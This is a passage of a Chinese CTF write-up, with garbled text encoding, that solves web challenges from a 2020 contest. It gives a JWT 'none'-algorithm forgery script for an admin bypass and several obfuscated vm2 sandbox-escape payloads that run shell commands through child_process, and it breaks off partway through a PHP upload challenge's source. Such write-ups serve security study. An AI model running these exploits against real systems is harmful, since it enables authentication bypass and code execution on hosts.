<p><img src="/2020/04/19/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E9%81%93%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93Web%E9%A2%98%E8%A7%A3/image-20200419174551545.png" alt="image-20200419174551545"></p>
<p>ç™»å½•æ—¶å…ˆè·å–secretidå€¼ï¼Œç„¶ååœ¨å…¨å±€çš„secretsé‡Œé¢è·å–å¯†é’¥ï¼Œä¹‹ååˆ©ç”¨jwt.verify()è§£å¯†ã€‚</p>
<img src="/2020/04/19/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E9%81%93%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93Web%E9%A2%98%E8%A7%A3/image-20200419175030662.png" alt="image-20200419175030662" style="zoom:150%;">

<p>å¹¶ä¸”åªæœ‰usernameä¸ºadminæ—¶æ‰èƒ½å¾—åˆ°flagã€‚</p>
<p>é¢˜ç›®æç¤ºè¯´ï¼š</p>
<img src="/2020/04/19/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E9%81%93%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93Web%E9%A2%98%E8%A7%A3/image-20200419173928204.png" alt="image-20200419173928204" style="zoom:150%;">

<p>æ˜¯ä¾èµ–åº“æœ‰é—®é¢˜ï¼Œç„¶åçœ‹package.json</p>
<p><img src="/2020/04/19/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E9%81%93%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93Web%E9%A2%98%E8%A7%A3/image-20200419174014185.png" alt="image-20200419174014185"></p>
<p>ç„¶åä»<a href="https://blog.csdn.net/a3320315/article/details/103092073" target="_blank" rel="noopener">è¿™ç¯‡æ–‡ç« </a>é‡Œçœ‹åˆ°</p>
<p><img src="/2020/04/19/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E9%81%93%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93Web%E9%A2%98%E8%A7%A3/image-20200419175440994.png" alt="image-20200419175440994"></p>
<p>ç„¶åçœ‹æœ¬é¢˜ç™»å½•æ—¶è§£tokençš„å¯†é’¥ï¼Œ</p>
<p><img src="/2020/04/19/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E9%81%93%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93Web%E9%A2%98%E8%A7%A3/image-20200419181915396.png" alt="image-20200419181915396"></p>
<p>é¦–å…ˆæ˜¯é€šè¿‡æå–tokenä¸­çš„secretidï¼Œç„¶ååˆ¤æ–­sidæ˜¯å¦åˆæ³•ã€‚ç„¶åå°†å–secrets[sid]ä½œä¸ºjwtè§£å¯†çš„å¯†é’¥ï¼Œè‹¥æ­¤å¤„secretä¸å­˜åœ¨ï¼Œ<code>jsonwebtoken</code>ä¼šé‡‡ç”¨<code>algorithm none</code>è¿›è¡Œè§£å¯†ï¼Œç„¶åæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ä¼ªé€ jwtå˜æˆadminï¼Œç„¶åå°±å¯ä»¥å¾—åˆ°flagã€‚</p>
<p>ç„¶åå›æº¯sidï¼Œå½“sidèƒ½å¤Ÿæ»¡è¶³<code>sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0</code>è€Œä¸”secriets[sid]ä¸ºç©ºï¼Œé‚£ä¹ˆå½“sidä¸º0.1èƒ½å¤Ÿæ»¡è¶³ï¼Œä¹‹åå³å¯ä¼ªé€ adminã€‚</p>
<p><img src="/2020/04/19/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E9%81%93%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93Web%E9%A2%98%E8%A7%A3/image-20200419193914408.png" alt="image-20200419193914408"></p>
<p>è§£é¢˜æ­¥éª¤ï¼š</p>
<ol>
<li><p>å…ˆå¾—åˆ°éadminçš„jwtï¼Œåˆ©ç”¨jet.ioè§£å¯†ã€‚</p>
<p><img src="/2020/04/19/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E9%81%93%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93Web%E9%A2%98%E8%A7%A3/image-20200419193720626.png" alt="image-20200419193720626"></p>
<p><img src="/2020/04/19/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E9%81%93%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93Web%E9%A2%98%E8%A7%A3/image-20200419194336137.png" alt="image-20200419194336137"></p>
</li>
<li><p>ä¼ªé€ jwtã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line">token = jwt.encode(&#123;</span><br><span class="line">  <span class="string">"secretid"</span>: <span class="number">0.1</span>,</span><br><span class="line">  <span class="string">"username"</span>: <span class="string">"admin"</span>,</span><br><span class="line">  <span class="string">"password"</span>: <span class="string">"dddd"</span>,</span><br><span class="line">  <span class="string">"iat"</span>: <span class="number">1587324387</span></span><br><span class="line">&#125;,algorithm=<span class="string">"none"</span>,key=<span class="string">""</span>).decode(encoding=<span class="string">'utf-8'</span>)</span><br><span class="line">print(token)</span><br></pre></td></tr></table></figure>


</li>
</ol>
<p><img src="/2020/04/19/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E9%81%93%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93Web%E9%A2%98%E8%A7%A3/image-20200419195024687.png" alt="image-20200419195024687"></p>
<ol start="3">
<li><p>æ›¿æ¢tokenç™»å½•ã€‚</p>
<p><img src="/2020/04/19/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E9%81%93%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93Web%E9%A2%98%E8%A7%A3/image-20200419195111379.png" alt="image-20200419195111379"></p>
</li>
<li><p>ä¿®æ”¹cookieï¼Œè®¿é—®/api/flagã€‚</p>
<p><img src="/2020/04/19/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E9%81%93%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93Web%E9%A2%98%E8%A7%A3/image-20200419195449455.png" alt="image-20200419195449455"></p>
</li>
</ol>
<blockquote>
<p>ä¹‹åçœ‹æ¥<a href="https://zhaoj.in" target="_blank" rel="noopener">èµµæ€»</a>çš„wpï¼Œä»–æ˜¯ç”¨çš„å°†sidèµ‹å€¼ä¸ºç©ºæ•°ç»„ï¼Œå› ä¸ºåœ¨javascriptä¸­ï¼Œç©ºæ•°ç»„ä¸æ•°å­—æ¯”è¾ƒæ°¸è¿œä¸ºçœŸï¼Œä¸‹é¢æ˜¯æµ‹è¯•ä»£ç </p>
<p><img src="/2020/04/19/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E9%81%93%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93Web%E9%A2%98%E8%A7%A3/image-20200420163634128.png" alt="image-20200420163634128"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line">token = jwt.encode(&#123;</span><br><span class="line">  <span class="string">"secretid"</span>: [],</span><br><span class="line">  <span class="string">"username"</span>: <span class="string">"admin"</span>,</span><br><span class="line">  <span class="string">"password"</span>: <span class="string">"dddd"</span>,</span><br><span class="line">  <span class="string">"iat"</span>: <span class="number">1587324387</span></span><br><span class="line">&#125;,algorithm=<span class="string">"none"</span>,key=<span class="string">""</span>).decode(encoding=<span class="string">'utf-8'</span>)</span><br><span class="line">print(token)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/19/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E9%81%93%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93Web%E9%A2%98%E8%A7%A3/image-20200420164707008.png" alt="image-20200420164707008"></p>
</blockquote>
<h1 id="0x02-just-escape"><a href="#0x02-just-escape" class="headerlink" title="0x02 just_escape"></a>0x02 just_escape</h1><p>è¿™é¢˜æ˜¯ä¸€é“nodejsæ²™ç®±é¢˜ï¼Œæ”¹çš„ä¹‹å‰ä¸€ä¸ªå›½å¤–æ¯”èµ›çš„é¢˜ï¼ŒåŠ äº†é™åˆ¶ï¼Œè¿‡æ»¤äº†å•å¼•å·ã€åŒå¼•å·å’Œä¸€äº›å…³é”®å­—(child_processã€execSyncã€prototypeã€constructorã€process)ã€‚</p>
<p>é¦–å…ˆå¯ä»¥<a href="https://github.com/patriksimek/vm2/issues/225" target="_blank" rel="noopener">æŸ¥åˆ°</a>ï¼Œå·²ç»æœ‰è¡¨å“¥å‘äº†expï¼Œç„¶åå°±æ˜¯å¯¹è¿‡æ»¤çš„ç»•è¿‡äº†ï¼Œ</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="meta">"use strict"</span>;</span><br><span class="line"><span class="keyword">const</span> &#123;VM&#125; = <span class="built_in">require</span>(<span class="string">'vm2'</span>);</span><br><span class="line"><span class="keyword">const</span> untrusted = <span class="string">'('</span> + <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="built_in">TypeError</span>.prototype.get_process = <span class="function"><span class="params">f</span>=&gt;</span>f.constructor(<span class="string">"return process"</span>)();</span><br><span class="line">	<span class="keyword">try</span>&#123;</span><br><span class="line">		<span class="built_in">Object</span>.preventExtensions(Buffer.from(<span class="string">""</span>)).a = <span class="number">1</span>;</span><br><span class="line">	&#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">		<span class="keyword">return</span> e.get_process(<span class="function"><span class="params">()</span>=&gt;</span>&#123;&#125;).mainModule.require(<span class="string">"child_process"</span>).execSync(<span class="string">"whoami"</span>).toString();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;+<span class="string">')()'</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="keyword">new</span> VM().run(untrusted));</span><br><span class="line">&#125;<span class="keyword">catch</span>(x)&#123;</span><br><span class="line">	<span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="meta">"use strict"</span>;</span><br><span class="line"><span class="keyword">const</span> &#123;VM&#125; = <span class="built_in">require</span>(<span class="string">'vm2'</span>);</span><br><span class="line"><span class="keyword">const</span> untrusted = <span class="string">'('</span> + <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">try</span>&#123;</span><br><span class="line">		Buffer.from(<span class="keyword">new</span> <span class="built_in">Proxy</span>(&#123;&#125;, &#123;</span><br><span class="line">			getOwnPropertyDescriptor()&#123;</span><br><span class="line">				<span class="keyword">throw</span> <span class="function"><span class="params">f</span>=&gt;</span>f.constructor(<span class="string">"return process"</span>)();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;));</span><br><span class="line">	&#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">		<span class="keyword">return</span> e(<span class="function"><span class="params">()</span>=&gt;</span>&#123;&#125;).mainModule.require(<span class="string">"child_process"</span>).execSync(<span class="string">"whoami"</span>).toString();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;+<span class="string">')()'</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="keyword">new</span> VM().run(untrusted));</span><br><span class="line">&#125;<span class="keyword">catch</span>(x)&#123;</span><br><span class="line">	<span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é¦–å…ˆå¼•å·å¯ä»¥ç”¨åå¼•å·`æ¥ç»•è¿‡ï¼Œå…³é”®å­—é€šè¿‡</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#96;$&#123;&#96;$&#123;&#96;prototyp&#96;&#125;e&#96;&#125;&#96;</span><br></pre></td></tr></table></figure>

<img src="/2020/04/19/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E9%81%93%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93Web%E9%A2%98%E8%A7%A3/image-20200419173554611.png" alt="image-20200419173554611" style="zoom:200%;">

<p>è¿™æ ·å­—ç¬¦ä¸²æ‹¼æ¥æ¥ç»•è¿‡</p>
<p>payloadï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>Â (<span class="params"></span>)</span>&#123;</span><br><span class="line">Â Â Â Â <span class="built_in">TypeError</span>[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`prototyp`</span>&#125;</span>e`</span>&#125;</span>`</span>][<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`get_proces`</span>&#125;</span>s`</span>&#125;</span>`</span>]Â =Â <span class="function"><span class="params">f</span>=&gt;</span>f[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`constructo`</span>&#125;</span>r`</span>&#125;</span>`</span>](<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`returnÂ this.proces`</span>&#125;</span>s`</span>&#125;</span>`</span>)();</span><br><span class="line">Â Â Â Â <span class="keyword">try</span>&#123;</span><br><span class="line">Â Â Â Â Â Â Â Â <span class="built_in">Object</span>.preventExtensions(Buffer.from(<span class="string">``</span>)).aÂ =Â <span class="number">1</span>;</span><br><span class="line">Â Â Â Â &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">return</span>Â e[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`get_proces`</span>&#125;</span>s`</span>&#125;</span>`</span>](<span class="function"><span class="params">()</span>=&gt;</span>&#123;&#125;).mainModule[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`requir`</span>&#125;</span>e`</span>&#125;</span>`</span>](<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`child_proces`</span>&#125;</span>s`</span>&#125;</span>`</span>)[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`exe`</span>&#125;</span>cSync`</span>&#125;</span>`</span>](<span class="string">`cat /flag`</span>).toString();</span><br><span class="line">Â Â Â Â &#125;</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">try</span>&#123;</span><br><span class="line">		Buffer.from(<span class="keyword">new</span> <span class="built_in">Proxy</span>(&#123;&#125;, &#123;</span><br><span class="line">			getOwnPropertyDescriptor()&#123;</span><br><span class="line">				<span class="keyword">throw</span> <span class="function"><span class="params">f</span>=&gt;</span>f[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`constructo`</span>&#125;</span>r`</span>&#125;</span>`</span>](<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`return proces`</span>&#125;</span>s`</span>&#125;</span>`</span>)();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;));</span><br><span class="line">	&#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">		<span class="keyword">return</span> e(<span class="function"><span class="params">()</span>=&gt;</span>&#123;&#125;).mainModule.require(<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`child_proces`</span>&#125;</span>s`</span>&#125;</span>`</span>)[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`exe`</span>&#125;</span>c`</span>&#125;</span>Sync`</span>](<span class="string">`whoami`</span>).toString();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure>

<p>å®˜æ–¹payload:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="params">()</span>=&gt;</span>&#123; <span class="built_in">TypeError</span>[[<span class="string">`p`</span>,<span class="string">`r`</span>,<span class="string">`o`</span>,<span class="string">`t`</span>,<span class="string">`o`</span>,<span class="string">`t`</span>,<span class="string">`y`</span>,<span class="string">`p`</span>,<span class="string">`e`</span>][<span class="string">`join`</span>](<span class="string">``</span>)][<span class="string">`a`</span>] = <span class="function"><span class="params">f</span>=&gt;</span>f[[<span class="string">`c`</span>,<span class="string">`o`</span>,<span class="string">`n`</span>,<span class="string">`s`</span>,<span class="string">`t`</span>,<span class="string">`r`</span>,<span class="string">`u`</span>,<span class="string">`c`</span>,<span class="string">`t`</span>,<span class="string">`o`</span>,<span class="string">`r`</span>][<span class="string">`join`</span>](<span class="string">``</span>)]([<span class="string">`r`</span>,<span class="string">`e`</span>,<span class="string">`t`</span>,<span class="string">`u`</span>,<span class="string">`r`</span>,<span class="string">`n`</span>,<span class="string">` `</span>,<span class="string">`p`</span>,<span class="string">`r`</span>,<span class="string">`o`</span>,<span class="string">`c`</span>,<span class="string">`e`</span>,<span class="string">`s`</span>,<span class="string">`s`</span>][<span class="string">`join`</span>](<span class="string">``</span>))(); <span class="keyword">try</span>&#123; <span class="built_in">Object</span>[<span class="string">`preventExtensions`</span>](Buffer[<span class="string">`from`</span>](<span class="string">``</span>))[<span class="string">`a`</span>] = <span class="number">1</span>; &#125;<span class="keyword">catch</span>(e)&#123; <span class="keyword">return</span> e[<span class="string">`a`</span>](<span class="function"><span class="params">()</span>=&gt;</span>&#123;&#125;)[<span class="string">`mainModule`</span>][[<span class="string">`r`</span>,<span class="string">`e`</span>,<span class="string">`q`</span>,<span class="string">`u`</span>,<span class="string">`i`</span>,<span class="string">`r`</span>,<span class="string">`e`</span>][<span class="string">`join`</span>](<span class="string">``</span>)]([<span class="string">`c`</span>,<span class="string">`h`</span>,<span class="string">`i`</span>,<span class="string">`l`</span>,<span class="string">`d`</span>,<span class="string">`_`</span>,<span class="string">`p`</span>,<span class="string">`r`</span>,<span class="string">`o`</span>,<span class="string">`c`</span>,<span class="string">`e`</span>,<span class="string">`s`</span>,<span class="string">`s`</span>][<span class="string">`join`</span>](<span class="string">``</span>))[[<span class="string">`e`</span>,<span class="string">`x`</span>,<span class="string">`e`</span>,<span class="string">`c`</span>,<span class="string">`S`</span>,<span class="string">`y`</span>,<span class="string">`n`</span>,<span class="string">`c`</span>][<span class="string">`join`</span>](<span class="string">``</span>)](<span class="string">`cat flag`</span>)[<span class="string">`toString`</span>](); &#125; &#125;)()</span><br></pre></td></tr></table></figure>

<blockquote>
<p>chamd5 <a href="https://mp.weixin.qq.com/s/ih2X8IXVFmrMVwJYuf5gng" target="_blank" rel="noopener">è§£æ³•</a></p>
<ul>
<li>åˆ©ç”¨base64ç¼–ç ç»•è¿‡å…³é”®å­—çš„è¿‡æ»¤</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">global[[<span class="string">`eva`</span>,%<span class="number">20</span><span class="string">`l`</span>].join(<span class="string">``</span>)](Buffer.from(<span class="string">`VHlwZUVycm9yLnByb3RvdHlwZS5nZXRfcHJvY2VzcyA9IGYgPT4gZi5jb25zdHJ1Y3RvcigicmV0dXJuIHByb2Nlc3MiKSgpOwp0cnkgewogICAgT2JqZWN0LnByZXZlbnRFeHRlbnNpb25zKEJ1ZmZlci5mcm9tKCIiKSkuYSA9IDE7Cn0gY2F0Y2ggKGUpIHsKICAgIGUuZ2V0X3Byb2Nlc3MoKCkgPT4geyB9KS5tYWluTW9kdWxlLnJlcXVpcmUoImNoaWxkX3Byb2Nlc3MiKS5leGVjU3luYygiY2F0IC9mbGFnIikudG9TdHJpbmcoKTsKfQ==`</span>,%<span class="number">20</span><span class="string">`base64`</span>).toString(<span class="string">`ascii`</span>));</span><br></pre></td></tr></table></figure>

<ul>
<li>åˆ©ç”¨hexç»•è¿‡</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="built_in">TypeError</span>[<span class="built_in">String</span>.fromCharCode(<span class="number">112</span>,<span class="number">114</span>,<span class="number">111</span>,<span class="number">116</span>,<span class="number">111</span>,<span class="number">116</span>,<span class="number">121</span>,<span class="number">112</span>,<span class="number">101</span>)][<span class="string">`\x67\x65\x74\x5f\x70\x72\x6f\x63\x65\x73\x73`</span>] = <span class="function"><span class="params">f</span>=&gt;</span>f[<span class="string">`\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72`</span>](<span class="string">`\x72\x65\x74\x75\x72\x6e\x20\x70\x72\x6f\x63\x65\x73\x73`</span>)();<span class="keyword">try</span>&#123;<span class="built_in">Object</span>.preventExtensions(Buffer.from(<span class="string">``</span>)).a = <span class="number">1</span>;&#125;<span class="keyword">catch</span>(e)&#123;<span class="keyword">return</span> e[<span class="string">`\x67\x65\x74\x5f\x70\x72\x6f\x63\x65\x73\x73`</span>](<span class="function"><span class="params">()</span>=&gt;</span>&#123;&#125;).mainModule.require((<span class="string">`\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73`</span>))[<span class="string">`\x65\x78\x65\x63\x53\x79\x6e\x63`</span>](<span class="string">`cat /flag`</span>).toString();&#125;&#125;)()</span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">try</span>&#123;</span><br><span class="line">		Buffer.from(<span class="keyword">new</span> <span class="built_in">Proxy</span>(&#123;&#125;, &#123;</span><br><span class="line">			getOwnPropertyDescriptor()&#123;</span><br><span class="line">				<span class="keyword">throw</span> <span class="function"><span class="params">f</span>=&gt;</span>f[<span class="string">`\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72`</span>](<span class="string">`\x72\x65\x74\x75\x72\x6e\x20\x70\x72\x6f\x63\x65\x73\x73`</span>)();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;));</span><br><span class="line">	&#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">		<span class="keyword">return</span> e(<span class="function"><span class="params">()</span>=&gt;</span>&#123;&#125;).mainModule.require(<span class="string">`\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73`</span>)[<span class="string">`\x65\x78\x65\x63\x53\x79\x6e\x63`</span>](<span class="string">`cat /flag`</span>).toString();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;()</span><br></pre></td></tr></table></figure>
</blockquote>
<p>é™„ä¸Šè‡ªå·±ç¼–çš„hexç¼–ç è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun</span><span class="params">(string)</span>:</span></span><br><span class="line">    result = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> string:</span><br><span class="line">        result += str(ord(i))</span><br><span class="line">        result += <span class="string">","</span></span><br><span class="line">    <span class="keyword">return</span> result[<span class="number">0</span>:<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"String.fromCharCode("</span>+fun(<span class="string">"prototype"</span>)+<span class="string">")"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun</span><span class="params">(string)</span>:</span></span><br><span class="line">	result = <span class="string">""</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> string:</span><br><span class="line">		result += <span class="string">"\\x"</span></span><br><span class="line">		result += i.encode(<span class="string">"hex"</span>)</span><br><span class="line">	<span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"`"</span>+fun(<span class="string">"get_process"</span>)+<span class="string">"`"</span></span><br></pre></td></tr></table></figure>

<h1 id="0x03-babyupload"><a href="#0x03-babyupload" class="headerlink" title="0x03 babyupload"></a>0x03 babyupload</h1><p>é¢˜ç›®ç›´æ¥ç»™äº†æºç ï¼Œ</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_save_path(<span class="string">"/var/babyctf/"</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">"/flag"</span>;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'username'</span>] ===<span class="string">'admin'</span>)</span><br><span class="line">&#123;</span><br><span class="line">    $filename=<span class="string">'/var/babyctf/success.txt'</span>;</span><br><span class="line">    <span class="keyword">if</span>(file_exists($filename))&#123;</span><br><span class="line">            safe_delete($filename);</span><br><span class="line">            <span class="keyword">die</span>($flag);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    $_SESSION[<span class="string">'username'</span>] =<span class="string">'guest'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$direction = filter_input(INPUT_POST, <span class="string">'direction'</span>);</span><br><span class="line">$attr = filter_input(INPUT_POST, <span class="string">'attr'</span>);</span><br><span class="line">$dir_path = <span class="string">"/var/babyctf/"</span>.$attr;</span><br><span class="line"><span class="keyword">if</span>($attr===<span class="string">"private"</span>)&#123;</span><br><span class="line">    $dir_path .= <span class="string">"/"</span>.$_SESSION[<span class="string">'username'</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($direction === <span class="string">"upload"</span>)&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!is_uploaded_file($_FILES[<span class="string">'up_file'</span>][<span class="string">'tmp_name'</span>]))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">'invalid upload'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $file_path = $dir_path.<span class="string">"/"</span>.$_FILES[<span class="string">'up_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">        $file_path .= <span class="string">"_"</span>.hash_file(<span class="string">"sha256"</span>,$_FILES[<span class="string">'up_file'</span>][<span class="string">'tmp_name'</span>]);</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/(\.\.\/|\.\.\\\\)/'</span>, $file_path))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">'invalid file path'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        @mkdir($dir_path, <span class="number">0700</span>, <span class="keyword">TRUE</span>);</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($_FILES[<span class="string">'up_file'</span>][<span class="string">'tmp_name'</span>],$file_path))&#123;</span><br><span class="line">            $upload_result = <span class="string">"uploaded"</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">'error while saving'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RuntimeException $e) &#123;</span><br><span class="line">        $upload_result = $e-&gt;getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">elseif</span> ($direction === <span class="string">"download"</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        $filename = basename(filter_input(INPUT_POST, <span class="string">'filename'</span>));</span><br><span class="line">        $file_path = $dir_path.<span class="string">"/"</span>.$filename;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/(\.\.\/|\.\.\\\\)/'</span>, $file_path))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> 